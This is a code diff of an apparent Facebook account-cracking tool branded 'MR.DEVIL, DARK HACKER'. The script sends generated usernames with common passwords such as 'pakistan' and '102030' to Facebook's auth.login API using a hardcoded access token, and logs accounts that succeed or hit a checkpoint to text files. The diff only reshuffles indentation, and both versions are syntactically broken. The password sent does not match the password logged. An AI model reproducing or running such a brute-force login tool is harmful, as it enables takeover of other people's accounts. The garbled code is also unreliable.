@@ -100,7 +100,7 @@ logo = """
 \033[1;91m  《MR.DEVIL, LORD OF DARK WORLD》 
 \033[0;95m═══════════════════════════════════════════                                             
  ​\033[1;92m>>>AUTHOR  : \033[1;93m MR.DEVIL 
-\033 [1;92m>>>TOOL nm : \033[1;93m MRD version 1.0.3
+ \033 [1;92m>>>TOOL nm : \033[1;93m MRD version 1.0.3
  ​\033[1;92m>>>MR DEVIL: \033[1;93m PROGRAMMER & DARK HACKER 
 ​\033[1;91m《~MR.DEVIL, LORD OF DARK WORLD~》
  ​______________________________________________
@@ -216,38 +216,38 @@ def action():
                         cps.write(k + c + user + pass3 + '\n')
                         cps.close()
                         cpb.append(c + user + pass3)
-                        else:
-                    pass4 = 'pakistan'
-                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                    q = json.load(data)
-                    if 'access_token' in q:
+                      else:
+                       pass4 = 'pakistan'
+                       data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                       q = json.load(data)
+                       if 'access_token' in q:
                         print '\x1b[1;92m  [MRD_OK]  ' + k + c + user + '  |  ' + pass4
                         okb = open('save/Ok.txt', 'a')
                         okb.write(k + c + user + pass3 + '\n')
                         okb.close()
                         oks.append(c + user + pass3)
-                    elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;91m  [MRD_CP] ' + k + c + user + '  |  ' + pass4
-                        cps = open('save/CP.txt', 'a')
-                        cps.write(k + c + user + pass4 + '\n')
-                        cps.close()
-                        cpb.append(c + user + pass4)
-                         else:
-                    pass5 = '102030'
-                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                    q = json.load(data)
-                    if 'access_token' in q:
-                        print '\x1b[1;92m  [MRD_OK]  ' + k + c + user + '  |  ' + pass5
-                        okb = open('save/Ok.txt', 'a')
-                        okb.write(k + c + user + pass5 + '\n')
-                        okb.close()
-                        oks.append(c + user + pass3)
-                    elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;91m  [MRD_CP] ' + k + c + user + '  |  ' + pass5
-                        cps = open('save/CP.txt', 'a')
-                        cps.write(k + c + user + pass5 + '\n')
-                        cps.close()
-                        cpb.append(c + user + pass5)
+                     elif 'www.facebook.com' in q['error_msg']:
+                          print '\x1b[1;91m  [MRD_CP] ' + k + c + user + '  |  ' + pass4
+                          cps = open('save/CP.txt', 'a')
+                          cps.write(k + c + user + pass4 + '\n')
+                          cps.close()
+                          cpb.append(c + user + pass4)
+                       else:
+                         pass5 = '102030'
+                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                         q = json.load(data)
+                        if 'access_token' in q:
+                         print '\x1b[1;92m  [MRD_OK]  ' + k + c + user + '  |  ' + pass5
+                         okb = open('save/Ok.txt', 'a')
+                         okb.write(k + c + user + pass5 + '\n')
+                         okb.close()
+                         oks.append(c + user + pass3)
+                     elif 'www.facebook.com' in q['error_msg']:
+                         print '\x1b[1;91m  [MRD_CP] ' + k + c + user + '  |  ' + pass5
+                         cps = open('save/CP.txt', 'a')
+                         cps.write(k + c + user + pass5 + '\n')
+                         cps.close()
+                         cpb.append(c + user + pass5)
                                 
         except:
             pass
